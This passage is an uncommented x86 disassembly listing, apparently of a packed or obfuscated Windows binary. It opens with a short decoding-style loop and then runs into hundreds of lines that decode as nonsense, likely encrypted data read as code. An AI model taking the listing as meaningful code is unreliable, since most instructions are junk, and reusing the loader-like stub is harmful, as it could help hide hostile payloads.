  401873:	mov    edi,0xf89f2dad
  401878:	mov    DWORD PTR [eax],edi
  40187a:	mov    DWORD PTR ds:0x430542,0x13
  401884:	cmp    DWORD PTR ds:0x430542,0x0
  40188b:	je     0x4018c5
  401891:	cmp    DWORD PTR ds:0x430542,0x21
  401898:	jne    0x4018a9
  40189e:	push   0x4555
  4018a3:	call   DWORD PTR ds:0x42eaa4
  4018a9:	mov    ebx,DWORD PTR ds:0x430542
  4018af:	dec    ebx
  4018b0:	mov    DWORD PTR ds:0x430542,ebx
  4018b6:	jmp    0x401884
  4018bb:	add    DWORD PTR ds:0x42e75e,0x42e762
  4018c5:	mov    eax,DWORD PTR [ebp-0x14]
  4018c8:	or     ecx,0x5402
  4018ce:	mov    ebx,DWORD PTR [ebp-0x8]
  4018d1:	mov    ecx,0x7510856
  4018d6:	xor    eax,ecx
  4018d8:	mov    esi,0x32729d
  4018dd:	sbb    DWORD PTR ds:0x4304b2,0x704c
  4018e7:	xor    ebx,ecx
  4018e9:	xor    edx,edx
  4018eb:	xor    DWORD PTR ds:0x42e76a,0x430542
  4018f5:	add    eax,esi
  4018f7:	add    ebx,esi
  4018f9:	sbb    DWORD PTR ds:0x430552,0x21a7
  401903:	jmp    0x401cb4
  401908:	ret    0xa9a5
  40190b:	imul   ebp,DWORD PTR [ecx+0x7b],0xffffffc4
  40190f:	mov    ebp,0x8064be64
  401914:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401915:	lods   al,BYTE PTR ds:[esi]
  401916:	out    dx,eax
  401917:	sub    eax,0x7e7e7516
  40191c:	xor    BYTE PTR [ecx+0x7e],0x7e
  401920:	mov    ds:0x4eda0aff,al
  401925:	stos   DWORD PTR es:[edi],eax
  401926:	jmp    0xf99a86dc
  40192b:	push   cs
  40192c:	pop    esp
  40192d:	mov    ebx,0x2b9034db
  401932:	sar    BYTE PTR [ecx-0x49],cl
  401935:	inc    ecx
  401936:	mov    edi,0xbcd3e40f
  40193b:	pop    ecx
  40193c:	fucom  st(6)
  40193e:	add    bl,BYTE PTR [ecx+0x2d]
  401941:	mov    ebp,0x4a017bf0
  401946:	cmp    DWORD PTR [edx+0x3058e550],ecx
  40194c:	arpl   WORD PTR [ebp+0x5],si
  40194f:	fist   WORD PTR [edi+0x2f]
  401952:	and    esi,DWORD PTR [esi-0x43529181]
  401958:	jae    0x4018eb
  40195a:	mov    eax,ds:0xd18693e5
  40195f:	or     DWORD PTR [esi+0x2],ecx
  401962:	ins    BYTE PTR es:[edi],dx
  401963:	aas    
  401964:	retf   0xd47a
  401967:	test   BYTE PTR ss:[edi],dh
  40196a:	pop    esp
  40196b:	inc    ecx
  40196c:	icebp  
  40196d:	and    al,0xc6
  40196f:	ret    0x243a
  401972:	sub    esp,ebp
  401974:	fmul   st,st(6)
  401976:	dec    ebp
  401977:	mov    dl,0xad
  401979:	popa   
  40197a:	sahf   
  40197b:	ss daa 
  40197d:	iret   
  40197e:	in     eax,0x69
  401980:	sti    
  401981:	retf   
  401982:	cmc    
  401983:	pop    ebp
  401984:	outs   dx,BYTE PTR ds:[esi]
  401985:	sbb    eax,0x1d0c1c1f
  40198a:	mov    ecx,0x902cac86
  40198f:	iret   
  401990:	bound  ebp,QWORD PTR [edi+0x3631277d]
  401996:	pusha  
  401997:	in     al,dx
  401998:	cmp    al,0x4c
  40199a:	dec    edi
  40199b:	(bad)  
  40199d:	xchg   ecx,eax
  40199e:	dec    esp
  40199f:	(bad)  
  4019a0:	fstp   QWORD PTR [ebp-0x74]
  4019a3:	shl    DWORD PTR [ebp-0x504fb7f2],cl
  4019a9:	aad    0xdf
  4019ab:	mov    ecx,0x90f4cef1
  4019b0:	ficomp DWORD PTR [ebx-0x46324dad]
  4019b6:	inc    ebx
  4019b7:	std    
  4019b8:	inc    edi
  4019b9:	in     al,0x31
  4019bb:	jb     0x401964
  4019bd:	pop    ebx
  4019be:	loop   0x401a16
  4019c0:	dec    ecx
  4019c1:	dec    ebx
  4019c2:	mov    es,WORD PTR [esi+0x62e0bd1c]
  4019c8:	pop    esi
  4019c9:	jo     0x4019b7
  4019cb:	and    eax,0xd1a9cb53
  4019d0:	adc    al,0x84
  4019d2:	pop    ds
  4019d3:	or     BYTE PTR [ebx+0x4b],bh
  4019d6:	or     BYTE PTR [edi-0x6c2df689],0xf3
  4019dd:	push   0x62
  4019df:	jp     0x401a06
  4019e1:	test   ebx,eax
  4019e3:	lahf   
  4019e4:	or     DWORD PTR [edi-0x5c],esp
  4019e7:	jle    0x401a3c
  4019e9:	fist   WORD PTR [ecx+0x5d]
  4019ec:	retf   0xa373
  4019ef:	dec    edx
  4019f0:	add    BYTE PTR [ebx-0x58],bh
  4019f3:	clc    
  4019f4:	push   esi
  4019f5:	mov    ebp,0x49d5e974
  4019fa:	push   ecx
  4019fb:	(bad)  
  4019fc:	out    0x4,al
  4019fe:	mov    bh,0x83
  401a00:	lods   al,BYTE PTR ds:[esi]
  401a01:	jecxz  0x4019c1
  401a03:	adc    eax,ebp
  401a05:	adc    dl,bl
  401a07:	jp     0x401a3f
  401a09:	jge    0x401a34
  401a0b:	js     0x401a05
  401a0d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401a0e:	xor    eax,0xa017c43f
  401a13:	cli    
  401a14:	pop    edx
  401a15:	adc    dh,BYTE PTR [ecx-0x2]
  401a18:	mov    ebx,0xdec2f571
  401a1d:	ja     0x401a9b
  401a1f:	and    BYTE PTR [ecx-0x43],bh
  401a22:	dec    edx
  401a23:	fisub  WORD PTR [edi+0x6ffc000f]
  401a2a:	push   DWORD PTR [ebx+0x42]
  401a2d:	mov    ss,WORD PTR [edx+0x3c8b8e0d]
  401a33:	clc    
  401a34:	push   es
  401a35:	pushf  
  401a36:	and    eax,0xebf046bf
  401a3b:	pushf  
  401a3c:	fstp   QWORD PTR [edi]
  401a3e:	lahf   
  401a3f:	push   ebp
  401a40:	pop    ebx
  401a41:	mov    cl,dl
  401a43:	mov    cl,0x3e
  401a45:	rcr    DWORD PTR [ebp+0xdd7f3f3],1
  401a4b:	or     dl,BYTE PTR [edi+0x75]
  401a4e:	cmp    eax,0x43501c65
  401a53:	ins    BYTE PTR es:[edi],dx
  401a54:	xlat   BYTE PTR ds:[ebx]
  401a55:	pop    ebx
  401a56:	xchg   edi,eax
  401a57:	call   0x633e:0xf4391ea4
  401a5e:	into   
  401a5f:	push   edi
  401a60:	fld    QWORD PTR [ebp+0x5f458ea8]
  401a66:	mov    dh,0xb0
  401a68:	cmc    
  401a69:	rcl    BYTE PTR [eax],1
  401a6b:	sbb    BYTE PTR [ecx-0x37],0xd
  401a6f:	mov    ch,0x67
  401a71:	adc    al,BYTE PTR [ebp+ebp*2-0x37]
  401a75:	sti    
  401a76:	xchg   BYTE PTR [esi-0xd613ef1],bl
  401a7c:	bound  ebx,QWORD PTR [eax+0x50]
  401a7f:	pop    DWORD PTR [edx]
  401a81:	cmp    ebx,DWORD PTR [edi-0x348f208b]
  401a87:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401a88:	cdq    
  401a89:	clc    
  401a8a:	dec    esp
  401a8b:	mov    ch,BYTE PTR [esi+0x39]
  401a8e:	pop    ss
  401a8f:	sub    edx,DWORD PTR [ecx-0x74]
  401a92:	out    dx,eax
  401a93:	lea    eax,[edx]
  401a95:	call   0xbde758e4
  401a9a:	cmp    ebp,DWORD PTR [edx-0x2e]
  401a9d:	xchg   edi,eax
  401a9e:	loopne 0x401a3d
  401aa0:	jno    0x401ae4
  401aa2:	cwde   
  401aa3:	sbb    bh,BYTE PTR [esi+0x60]
  401aa6:	push   ebp
  401aa7:	mov    bl,0x21
  401aa9:	pushf  
  401aaa:	mov    ebx,0xaf84fbec
  401aaf:	sbb    DWORD PTR [esi-0x3e2b7449],0xffffff8e
  401ab6:	jle    0x401b1a
  401ab8:	movzx  ebx,ch
  401abb:	loop   0x401aaf
  401abd:	adc    al,0x19
  401abf:	jecxz  0x401a75
  401ac1:	loop   0x401a7d
  401ac3:	push   esi
  401ac4:	shl    cl,1
  401ac6:	mov    ds:0x479fe9f8,eax
  401acb:	fs jnp 0x401a67
  401ace:	scas   al,BYTE PTR es:[edi]
  401acf:	jmp    0x401acf
  401ad1:	(bad)  
  401ad2:	sub    eax,0xcb32ef9c
  401ad7:	pop    edx
  401ad8:	dec    esp
  401ad9:	mov    eax,ds:0x92c5c29
  401ade:	(bad)  
  401adf:	or     BYTE PTR [esi],cl
  401ae1:	pop    esp
  401ae2:	pusha  
  401ae3:	or     al,ch
  401ae5:	in     al,0x35
  401ae7:	inc    ebp
  401ae8:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401ae9:	bnd jb 0x401abb
  401aec:	or     DWORD PTR [edi-0x10626f6f],0xffffffae
  401af3:	inc    edx
  401af4:	retf   
  401af5:	gs jg  0x401ab4
  401af8:	mov    ds,eax
  401afa:	shr    DWORD PTR [edx],cl
  401afc:	test   al,0x61
  401afe:	jp     0x401b2f
  401b00:	dec    esi
  401b01:	sub    eax,0x41b27864
  401b06:	dec    ecx
  401b07:	jecxz  0x401aaf
  401b09:	sub    al,0x90
  401b0b:	(bad)  
  401b0c:	out    dx,eax
  401b0d:	dec    edx
  401b0e:	inc    ebp
  401b0f:	cli    
  401b10:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  401b11:	repz (bad) 
  401b13:	or     bl,BYTE PTR [ebp+0x2c03409a]
  401b19:	xchg   BYTE PTR [ebx-0xc],ch
  401b1c:	adc    BYTE PTR [ecx],bl
  401b1e:	sti    
  401b1f:	or     BYTE PTR [esi],dh
  401b21:	push   es
  401b22:	mov    dl,0x2c
  401b24:	mov    cl,BYTE PTR [edx-0x47c48882]
  401b2a:	adc    eax,0xbcf9ea76
  401b2f:	mov    bl,0x79
  401b31:	jbe    0x401b95
  401b33:	jmp    0x7e6a:0x8f7b5bbf
  401b3a:	fldcw  WORD PTR [ecx-0x13]
  401b3d:	push   edi
  401b3e:	or     edi,DWORD PTR [edi]
  401b40:	addr16 push esi
  401b42:	js     0x401b2d
  401b44:	dec    eax
  401b45:	arpl   WORD PTR [esp+edi*2+0x3],ax
  401b49:	out    dx,eax
  401b4a:	in     eax,dx
  401b4b:	sbb    BYTE PTR [ecx],cl
  401b4d:	cmp    bl,BYTE PTR [eax]
  401b4f:	ret    
  401b50:	adc    DWORD PTR [ebp+0x6],ecx
  401b53:	(bad)  
  401b54:	pop    ebp
  401b55:	dec    eax
  401b56:	stos   BYTE PTR es:[edi],al
  401b57:	out    dx,al
  401b58:	(bad)  
  401b59:	cmp    al,0x46
  401b5b:	into   
  401b5c:	js     0x401b25
  401b5e:	ja     0x401b0b
  401b60:	adc    BYTE PTR [ebp-0x57],bh
  401b63:	jne    0x401b8f
  401b65:	mov    al,ds:0x60482417
  401b6a:	push   0xffffffd8
  401b6c:	mov    edx,0x2db11098
  401b71:	add    DWORD PTR [esp+ecx*1],eax
  401b74:	test   eax,0xe020229
  401b79:	push   eax
  401b7a:	addr16 cmc 
  401b7c:	sub    cl,BYTE PTR [esi+0x562741a3]
  401b82:	out    dx,al
  401b83:	(bad)  
  401b84:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401b85:	fisubr DWORD PTR [esi-0x36]
  401b88:	lahf   
  401b89:	test   al,0x99
  401b8b:	lahf   
  401b8c:	pop    esi
  401b8d:	fucomi st,st(3)
  401b8f:	retf   0x666e
  401b92:	jnp    0x401be2
  401b94:	mov    dl,0xd8
  401b96:	xchg   esp,eax
  401b97:	je     0x401b26
  401b99:	add    al,0x42
  401b9b:	das    
  401b9c:	xlat   BYTE PTR ds:[ebx]
  401b9d:	pop    ebx
  401b9e:	stos   DWORD PTR es:[edi],eax
  401b9f:	dec    esi
  401ba0:	mov    ebx,0xf3f8726
  401ba5:	(bad)  
  401ba6:	cwde   
  401ba7:	sahf   
  401ba8:	mov    ds:0xbd0a90be,eax
  401bad:	cmp    BYTE PTR ds:[edx+edx*2+0x70],0xa
  401bb3:	(bad)  
  401bb4:	pusha  
  401bb5:	push   esp
  401bb6:	hlt    
  401bb7:	ins    BYTE PTR es:[edi],dx
  401bb8:	xchg   ecx,eax
  401bb9:	inc    ecx
  401bba:	jne    0x401b89
  401bbc:	and    esi,edx
  401bbe:	ret    
  401bbf:	jmp    0x401b6a
  401bc1:	(bad)  
  401bc2:	daa    
  401bc3:	aam    0x4d
  401bc5:	fild   WORD PTR [edx-0x496f981c]
  401bcb:	adc    eax,0xc9897f93
  401bd0:	push   ds
  401bd1:	mov    eax,0x1b8e002f
  401bd6:	or     al,0xc
  401bd8:	jne    0x401ba1
  401bda:	xchg   ebp,eax
  401bdb:	adc    bh,BYTE PTR [edx-0x520ea48b]
  401be1:	dec    ecx
  401be2:	fild   DWORD PTR [edx]
  401be4:	out    dx,eax
  401be5:	xchg   ebx,eax
  401be6:	jecxz  0x401c08
  401be8:	stos   DWORD PTR es:[edi],eax
  401be9:	packssdw mm0,QWORD PTR ss:[ebx]
  401bed:	xor    DWORD PTR [ecx+0x50],ecx
  401bf0:	adc    bh,BYTE PTR [esi-0x1c]
  401bf3:	imul   esi,DWORD PTR [ecx-0x44],0x7f8a8920
  401bfa:	inc    ebx
  401bfb:	and    BYTE PTR [esi-0x28],dh
  401bfe:	loop   0x401b86
  401c00:	adc    BYTE PTR [ecx],al
  401c02:	adc    cl,BYTE PTR [edi+0x7c]
  401c05:	xor    eax,DWORD PTR [edi-0x6c422270]
  401c0b:	(bad)  
  401c0c:	ds push 0x21a9a4cd
  401c12:	mov    esi,0x295149a2
  401c17:	mov    ch,0xff
  401c19:	mov    ebx,0xef520597
  401c1e:	mov    ch,0x87
  401c20:	clc    
  401c21:	and    eax,0x87e65c4a
  401c26:	aam    0xa0
  401c28:	mov    cl,0xdb
  401c2a:	sahf   
  401c2b:	pop    gs
  401c2d:	mov    ebp,0x9baca329
  401c32:	dec    ebp
  401c33:	ja     0x401be4
  401c35:	jns    0x401bc8
  401c37:	add    BYTE PTR [eax],0x86
  401c3a:	mov    ds:0xf7b87947,al
  401c3f:	(bad)  
  401c40:	pop    esp
  401c41:	fld    QWORD PTR [ebp-0x3]
  401c44:	call   0xac97:0x703bf349
  401c4b:	mov    edx,0xa5116bf1
  401c50:	pop    ecx
  401c51:	(bad)  
  401c52:	aam    0x8a
  401c54:	pop    eax
  401c55:	lahf   
  401c56:	enter  0xfc22,0x97
  401c5a:	push   edi
  401c5b:	out    0x8a,eax
  401c5d:	jb     0x401bf4
  401c5f:	lock pop edx
  401c61:	in     al,dx
  401c62:	cmp    al,0x4f
  401c64:	idiv   eax
  401c66:	push   ss
  401c67:	and    edi,DWORD PTR [eax-0x66038b86]
  401c6d:	xor    BYTE PTR [edi-0x379c66a7],0xf6
  401c74:	xchg   BYTE PTR [edx-0xbcf799a],bh
  401c7a:	jbe    0x401c49
  401c7c:	jbe    0x401c07
  401c7e:	test   al,0x3e
  401c80:	test   al,0x83
  401c82:	dec    eax
  401c83:	shl    BYTE PTR [eax],cl
  401c85:	push   esp
  401c86:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  401c87:	cmp    BYTE PTR [edx],al
  401c89:	aaa    
  401c8a:	adc    bh,BYTE PTR [edi-0x1c]
  401c8d:	sbb    DWORD PTR [ecx-0x5661eab0],0xffffffc2
  401c94:	ficom  DWORD PTR [ecx-0x71]
  401c97:	cmp    DWORD PTR [esi-0x2c130258],edi
  401c9d:	or     al,dl
  401c9f:	das    
  401ca0:	inc    eax
  401ca1:	fs sar esp,1
  401ca4:	cmp    DWORD PTR [ebp-0x1a822b41],esi
  401caa:	add    eax,0xf90b1de4
  401caf:	jge    0x401c91
  401cb1:	sub    al,0x49
  401cb3:	xor    edi,0xfffffff3
  401cb6:	mov    DWORD PTR ds:0x42ee20,0x29
  401cc0:	jmp    0x402071
  401cc5:	pop    ds
  401cc6:	nop
  401cc7:	jl     0x401d20
  401cc9:	jge    0x401d46
  401ccb:	and    eax,0x749e668
  401cd0:	jns    0x401cac
  401cd2:	mov    bl,0xd2
  401cd4:	sbb    eax,0x7e7e08ba
  401cd9:	xor    BYTE PTR [ecx+0x7e],0x7e
  401cdd:	cwde   
  401cde:	sbb    eax,0xe25bd547
  401ce3:	icebp  
  401ce4:	sub    ecx,DWORD PTR [edi-0xa]
  401ce7:	call   0xd60a:0xce549683
  401cee:	jo     0x401cb3
  401cf0:	dec    edx
  401cf1:	sar    DWORD PTR [ecx-0x2f],cl
  401cf4:	sbb    cl,BYTE PTR [ebp-0x24bae1d3]
  401cfa:	fistp  DWORD PTR [ecx]
  401cfc:	cwde   
  401cfd:	(bad)  
  401cff:	iret   
  401d00:	adc    eax,0x4b18f940
  401d05:	pop    ebp
  401d06:	fisubr WORD PTR [ebx-0x18]
  401d09:	(bad)  
  401d0a:	bound  ebp,QWORD PTR [ecx-0x7a562209]
  401d10:	sub    eax,0x683bcf79
  401d15:	enter  0xc774,0xb6
  401d19:	add    edi,DWORD PTR [edx]
  401d1b:	sub    dl,cl
  401d1d:	push   esi
  401d1e:	sub    al,BYTE PTR [ecx+0x16]
  401d21:	(bad)  
  401d22:	stos   BYTE PTR es:[edi],al
  401d23:	mov    ds:0x4a937919,al
  401d28:	(bad)  
  401d29:	dec    edx
  401d2a:	xchg   edx,eax
  401d2b:	dec    ecx
  401d2c:	mov    dh,0x19
  401d2e:	mov    eax,ds:0xff9c0a22
  401d33:	das    
  401d34:	into   
  401d35:	xor    ecx,esi
  401d37:	retf   
  401d38:	sub    BYTE PTR [edi],dl
  401d3a:	mov    bl,0x89
  401d3c:	and    eax,0xe1d8230f
  401d41:	shl    DWORD PTR [edi+ebp*1+0x240cd3e1],1
  401d48:	xchg   ebx,eax
  401d49:	jns    0x401d53
  401d4b:	mov    esi,0x7625fb0d
  401d50:	cs fsub st,st(3)
  401d53:	sub    DWORD PTR [eax-0x56b9b292],0x3d
  401d5a:	cmp    eax,0xf11cc7e0
  401d5f:	ror    DWORD PTR [ebx-0x4],0x6c
  401d63:	ror    BYTE PTR [eax+0x4b],cl
  401d66:	xchg   ebx,eax
  401d67:	pop    esi
  401d68:	sbb    ah,0x5d
  401d6b:	jae    0x401da9
  401d6d:	stos   DWORD PTR es:[edi],eax
  401d6e:	sbb    dl,cl
  401d70:	cli    
  401d71:	xlat   BYTE PTR ds:[ebx]
  401d72:	and    al,0xdc
  401d75:	dec    esi
  401d76:	retf   0xc10
  401d79:	and    dh,BYTE PTR [esi-0x31]
  401d7c:	fsubr  DWORD PTR [esi+0xbec294a]
  401d82:	rdtsc  
  401d84:	pusha  
  401d85:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  401d86:	call   0x6cc0bbe6
  401d8b:	clc    
  401d8c:	sar    ebx,cl
  401d8e:	mov    ecx,0xd9111030
  401d93:	mov    dl,0x4b
  401d95:	es mov al,0x49
  401d98:	mov    cl,0xde
  401d9a:	dec    ecx
  401d9b:	bound  sp,DWORD PTR [ecx+0x32]
  401d9f:	dec    edx
  401da0:	add    DWORD PTR [edi],esi
  401da2:	out    dx,al
  401da3:	xor    eax,0xa2b533b6
  401da8:	mov    ebp,0x3706c005
  401dad:	jbe    0x401d6a
  401daf:	in     al,dx
  401db0:	xchg   esi,eax
  401db1:	dec    esp
  401db2:	push   es
  401db3:	xchg   edi,eax
  401db4:	add    eax,0x202abb7a
  401db9:	jg     0x401e2e
  401dbb:	mov    esi,0xeb89869b
  401dc0:	xchg   esi,eax
  401dc1:	lods   eax,DWORD PTR ds:[esi]
  401dc2:	movsx  esp,cl
  401dc5:	or     dl,BYTE PTR [edi-0x2cf143b2]
  401dcb:	leave  
  401dcc:	out    dx,al
  401dcd:	pop    edx
  401dce:	jge    0x401d95
  401dd0:	xor    ebx,edi
  401dd2:	pop    ss
  401dd3:	dec    edi
  401dd4:	das    
  401dd5:	pop    edi
  401dd6:	call   0x4916:0xe2a85f55
  401ddd:	jbe    0x401e4e
  401ddf:	or     cl,BYTE PTR [edx+0x65]
  401de2:	pop    ecx
  401de3:	gs clc 
  401de5:	xlat   BYTE PTR ds:[ebx]
  401de6:	mov    ch,0x82
  401de8:	jmp    0xc135aff5
  401ded:	pop    es
  401dee:	jbe    0x401df4
  401df0:	jo     0x401e22
  401df2:	dec    ebp
  401df3:	pop    esi
  401df4:	addr16 xchg esi,eax
  401df6:	ror    BYTE PTR [esi],0xb2
  401df9:	sbb    DWORD PTR [ebp+0x3eccd81f],ecx
  401dff:	gs pop es
  401e01:	cmp    BYTE PTR [ebp-0x6b3e055f],ah
  401e07:	pusha  
  401e08:	das    
  401e09:	push   edi
  401e0a:	add    DWORD PTR [edx-0x63],ebx
  401e0d:	mov    cl,0x33
  401e0f:	sbb    si,cx
  401e12:	in     al,dx
  401e13:	adc    BYTE PTR [ebp+0x79],0x3
  401e17:	xchg   ebp,eax
  401e18:	std    
  401e19:	push   esi
  401e1a:	in     al,0x75
  401e1c:	and    edx,esp
  401e1e:	aas    
  401e1f:	adc    BYTE PTR [eax],ch
  401e21:	aam    0xc2
  401e23:	icebp  
  401e24:	call   0x81dd581b
  401e29:	daa    
  401e2a:	std    
  401e2b:	push   ecx
  401e2c:	dec    ebp
  401e2d:	out    dx,al
  401e2e:	cdq    
  401e2f:	pop    esp
  401e30:	sub    DWORD PTR [edx],eax
  401e32:	lds    ebp,FWORD PTR [edx+0x75]
  401e35:	or     BYTE PTR [ebx+0x9],ah
  401e38:	mov    edi,0xce0bb500
  401e3d:	adc    ch,bh
  401e3f:	retf   0x1d87
  401e42:	je     0x401e4c
  401e44:	jns    0x401e09
  401e46:	mov    WORD PTR [esi],fs
  401e48:	dec    edx
  401e49:	aaa    
  401e4a:	leave  
  401e4b:	sub    DWORD PTR cs:[eax+0x7a80e3df],0xffffffad
  401e53:	jmp    0xa4407395
  401e58:	add    ch,dl
  401e5a:	pop    ebx
  401e5b:	mov    fs,ecx
  401e5d:	pop    edx
  401e5e:	ret    0x1611
  401e61:	lods   eax,DWORD PTR ds:[esi]
  401e62:	inc    eax
  401e63:	pop    ds
  401e64:	ret    0xe1b1
  401e67:	mov    edi,0xb62cde43
  401e6c:	cmc    
  401e6d:	xor    DWORD PTR [ebx+0xe1a82b1],eax
  401e73:	daa    
  401e74:	pop    edx
  401e75:	xchg   ebp,eax
  401e76:	das    
  401e77:	into   
  401e78:	leave  
  401e79:	add    eax,DWORD PTR [edi]
  401e7b:	pop    bp
  401e7d:	and    eax,DWORD PTR fs:[esi]
  401e80:	and    al,0x5
  401e82:	leave  
  401e83:	or     DWORD PTR [eax-0x19],ecx
  401e86:	push   cs
  401e87:	adc    DWORD PTR [edi],0x78
  401e8a:	xor    eax,0x23aab5ef
  401e8f:	hlt    
  401e90:	mov    ecx,0x8f371dee
  401e95:	jbe    0x401eb4
  401e97:	sub    al,0x67
  401e99:	(bad)  
  401e9a:	popf   
  401e9b:	cwde   
  401e9c:	push   esi
  401e9d:	sub    esi,DWORD PTR [ebx]
  401e9f:	sub    ecx,DWORD PTR [edx-0x3f]
  401ea2:	aam    0xec
  401ea4:	mov    ds:0xba89acb4,al
  401ea9:	mov    al,ds:0x2a9970dd
  401eae:	mov    ah,0xeb
  401eb0:	daa    
  401eb1:	nop
  401eb2:	frstor [ebx+0x2056a71b]
  401eb8:	sbb    eax,0x832f0d42
  401ebd:	fsubr  DWORD PTR [edx]
  401ebf:	push   ebp
  401ec0:	jmp    0x83d7597f
  401ec5:	sub    eax,DWORD PTR [ebp+0x41641216]
  401ecb:	repz cmp eax,0x59731a2b
  401ed1:	sbb    eax,ecx
  401ed3:	fistp  DWORD PTR [ebx+0x6c]
  401ed6:	dec    edx
  401ed7:	fs bswap edx
  401eda:	pop    esi
  401edb:	repz daa 
  401edd:	fscale 
  401edf:	mov    ebx,DWORD PTR ds:0xaa4a99d0
  401ee5:	push   ss
  401ee6:	pop    esp
  401ee7:	fld    TBYTE PTR [ebp+0x20]
  401eea:	bound  eax,QWORD PTR [ebx+0x32073213]
  401ef0:	(bad)  
  401ef1:	mov    DWORD PTR [edi-0x6b3ecc8f],0xd69ad752
  401efb:	add    ch,cl
  401efd:	dec    esp
  401efe:	rcr    esp,1
  401f00:	inc    edx
  401f01:	inc    ecx
  401f02:	mov    DWORD PTR [edi],esp
  401f04:	jge    0x401ed6
  401f06:	stos   DWORD PTR es:[edi],eax
  401f07:	or     al,0xc
  401f09:	or     ah,0x1a
  401f0c:	mov    esi,0x75eefaa8
  401f11:	sub    eax,DWORD PTR ds:0xa6b6dbe7
  401f17:	ds jmp 0xfca88fef
  401f1d:	jo     0x401f39
  401f1f:	mov    ebp,0x33c8f7dd
  401f24:	push   esi
  401f25:	mov    ah,0xdb
  401f27:	das    
  401f28:	and    DWORD PTR [ecx+0x3eb88696],edx
  401f2e:	jmp    0xab3ec3a7
  401f33:	fcomp  st(6)
  401f35:	into   
  401f36:	popf   
  401f37:	sbb    BYTE PTR ds:0x630191a7,al
  401f3d:	inc    ebx
  401f3e:	cld    
  401f3f:	daa    
  401f40:	ss int3 
  401f42:	pusha  
  401f43:	out    0xe3,eax
  401f45:	xor    al,0x71
  401f47:	fcmove st,st(2)
  401f49:	jp     0x401f3b
  401f4b:	cli    
  401f4c:	out    0xfa,eax
  401f4e:	mov    ah,0xe3
  401f50:	sbb    edi,DWORD PTR ss:[ebp-0x13]
  401f54:	lods   eax,DWORD PTR ds:[esi]
  401f55:	cmp    DWORD PTR [ebx],ebp
  401f57:	mov    edx,0x3eb15712
  401f5c:	sub    ch,BYTE PTR [eax+0x49076abb]
  401f62:	cwde   
  401f63:	hlt    
  401f64:	out    dx,al
  401f65:	mov    ch,0x5a
  401f67:	mov    esi,0xe0c95ff5
  401f6c:	add    BYTE PTR [ebx+0x5c],cl
  401f6f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401f70:	imul   BYTE PTR [esi]
  401f72:	add    DWORD PTR [eax],0xa8c20d43
  401f78:	out    dx,al
  401f79:	cmp    al,0xf4
  401f7b:	adc    ebp,DWORD PTR [esi-0x7290ed20]
  401f81:	xor    al,0x74
  401f83:	loope  0x401fae
  401f85:	mov    ebp,0xfe1f0887
  401f8a:	xchg   esi,eax
  401f8b:	adc    bh,bh
  401f8d:	fs ins BYTE PTR es:[edi],dx
  401f8f:	and    ch,BYTE PTR [edi+0x240ef3b6]
  401f95:	pop    esp
  401f96:	aad    0x5f
  401f98:	das    
  401f99:	pop    DWORD PTR [edx-0x23]
  401f9c:	test   BYTE PTR [ecx-0x3b],al
  401f9f:	push   ebx
  401fa0:	xchg   ecx,eax
  401fa1:	mov    cs,WORD PTR [esi-0x99bfd1a]
  401fa7:	ds into 
  401fa9:	cmp    esp,esi
  401fab:	cld    
  401fac:	arpl   WORD PTR [esi+0x4f],bx
  401faf:	and    DWORD PTR [ebp+0x78],ebx
  401fb2:	pushf  
  401fb3:	aas    
  401fb4:	test   ebx,esi
  401fb6:	lods   eax,DWORD PTR ds:[esi]
  401fb7:	(bad)  
  401fb8:	gs or  al,0xa9
  401fbb:	pop    ebp
  401fbc:	cmp    eax,0x3997d8fe
  401fc1:	ins    BYTE PTR es:[edi],dx
  401fc2:	jb     0x402038
  401fc4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  401fc5:	pop    es
  401fc6:	js     0x401f68
  401fc8:	loop   0x402024
  401fca:	jmp    0x8caee10c
  401fcf:	into   
  401fd0:	mov    edx,0xdd98759a
  401fd5:	jno    0x401ff1
  401fd7:	aam    0x76
  401fd9:	xchg   esp,eax
  401fda:	dec    ecx
  401fdb:	lods   eax,DWORD PTR ds:[esi]
  401fdc:	(bad)  
  401fdd:	retf   0x6d91
  401fe0:	popf   
  401fe1:	cmc    
  401fe2:	fnstsw WORD PTR [edx+0x51]
  401fe5:	xor    ch,BYTE PTR [ecx+0x70]
  401fe8:	mov    al,ds:0x914c5dad
  401fed:	or     DWORD PTR [eax+0x4b],esp
  401ff0:	pop    ebp
  401ff1:	fidivr DWORD PTR [ecx-0x29db7b7f]
  401ff7:	push   ds
  401ff8:	xor    ecx,esi
  401ffa:	lods   al,BYTE PTR ds:[esi]
  401ffb:	call   0xfcc5:0x64966359
  402002:	xor    ebp,DWORD PTR [ebx+0x2a]
  402005:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  402006:	mov    bl,0x36
  402008:	lods   eax,DWORD PTR ds:[esi]
  402009:	push   esi
  40200a:	in     eax,dx
  40200b:	popf   
  40200c:	inc    eax
  40200d:	jnp    0x401fd7
  40200f:	adc    esi,DWORD PTR [esi+0x61]
  402012:	inc    eax
  402013:	dec    BYTE PTR [ecx]
  402015:	lea    edx,[esi-0x9]
  402018:	mov    WORD PTR [esi],di
  40201b:	xor    al,0x87
  40201d:	mov    ds:0x1744b4a4,al
  402022:	and    BYTE PTR [esi+0x2d753df],ah
  402028:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  402029:	loop   0x402090
  40202b:	sub    BYTE PTR [ebx+0x3],dh
  40202e:	and    al,al
  402030:	mov    esp,0xa96c3b8b
  402035:	or     BYTE PTR [eax],cl
  402037:	fstp   QWORD PTR [ebp+0x31]
  40203a:	xchg   ecx,eax
  40203b:	xchg   DWORD PTR [edx],edi
  40203d:	outs   dx,DWORD PTR ds:[esi]
  40203e:	sti    
  40203f:	or     ebx,DWORD PTR [ebp-0x2dcf7647]
  402045:	outs   dx,BYTE PTR ds:[esi]
  402046:	sbb    al,0xed
  402048:	mov    esi,DWORD PTR [esi-0x52a5b83a]
  40204e:	sbb    ebx,ebp
  402050:	or     BYTE PTR ds:0x1135e8ca,ah
  402056:	adc    al,0xc9
  402058:	pop    ds
